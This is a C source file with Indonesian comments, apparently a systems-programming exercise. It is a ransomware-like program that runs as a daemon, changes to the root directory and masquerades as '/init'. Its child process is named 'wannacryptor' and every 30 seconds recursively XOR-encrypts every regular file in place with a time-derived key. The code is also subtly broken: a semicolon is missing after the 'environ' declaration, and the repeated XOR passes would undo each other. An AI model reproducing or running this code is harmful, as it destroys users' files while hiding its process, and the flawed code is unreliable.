#include <dirent.h>
#include <sys/prctl.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>

extern char **environ

void daemonize() {
  pid_t pid, sid;        // Variabel untuk menyimpan PID
  pid = fork();     // Menyimpan PID dari Child Process

  /* Keluar saat fork gagal
  * (nilai variabel pid < 0) */
  if (pid < 0) {
    exit(EXIT_FAILURE);
  }

  /* Keluar saat fork berhasil
  * (nilai variabel pid adalah PID dari child process) */
  if (pid > 0) {
    exit(EXIT_SUCCESS);
  }

  umask(0);

  sid = setsid();
  if (sid < 0) {
    exit(EXIT_FAILURE);
  }

  if ((chdir("/")) < 0) {
    exit(EXIT_FAILURE);
  }

  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
}

void anak(const char *name, int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, name, 0, 0, 0);

    if (argc > 0) {
        memset(argv[0], 0, strlen(argv[0]));
        strncpy(argv[0], name, 63);
    }
}

void xor_file(const char *filename, unsigned int key) {
    char tmp[512];
    snprintf(tmp, sizeof(tmp), "%s.tmp", filename);

    FILE *in = fopen(filename, "rb");
    FILE *out = fopen(tmp, "wb");
    if (!in || !out) return;

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in); fclose(out);
    remove(filename);
    rename(tmp, filename);
}

void encrypt(const char *path, unsigned int key) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *ent;
    char full[1024];

    while ((ent = readdir(dir))) {
        if (!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")) continue;
        snprintf(full, sizeof(full), "%s/%s", path, ent->d_name);

        struct stat st;
        if (stat(full, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) encrypt(full, key);
        else if (S_ISREG(st.st_mode)) xor_file(full, key);
    }

    closedir(dir);
}

int main(int argc, char *argv[]) {
    daemonize();
    strncpy(argv[0], "/init", strlen(argv[0]));
    if (fork() == 0) {
        anak("wannacryptor", argc, argv);
        unsigned int key = (unsigned int) time(NULL);
        while (1) {
            encrypt(".", key);
            sleep(30);
        }
    }
    while (1) {
      sleep(30);
    }
  return 0;
}
